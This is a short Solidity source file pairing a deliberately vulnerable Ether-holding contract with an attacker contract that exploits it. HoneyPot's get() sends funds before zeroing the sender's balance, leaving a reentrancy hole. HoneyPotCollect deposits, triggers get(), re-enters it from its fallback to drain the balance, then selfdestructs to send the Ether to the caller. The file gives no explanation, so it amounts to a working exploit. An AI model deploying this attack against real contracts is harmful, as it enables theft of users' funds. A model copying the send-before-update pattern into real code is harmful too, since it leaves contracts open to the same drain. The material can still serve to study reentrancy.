pragma solidity ^0.4.23;

contract HoneyPot {

    mapping (address => uint) public balances;

    constructor() payable public {
        put();
    }

    function put() payable public {
        balances[msg.sender] = msg.value;
    }

    function get() public {
        if(!msg.sender.call.value(balances[msg.sender])()) {
            revert();
        }
        balances[msg.sender] = 0;
    }

    function () public {
        revert();
    }
}

contract HoneyPotCollect {
    HoneyPot public honeypot;

    constructor(address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
    }

    function kill() public {
        selfdestruct(msg.sender);
    }

    function collect() payable public {
        honeypot.put.value(msg.value)();
        honeypot.get();
        kill();
    }

    function () payable public {
        if(honeypot.balance >= msg.value) {
            honeypot.get();
        }
    }
}
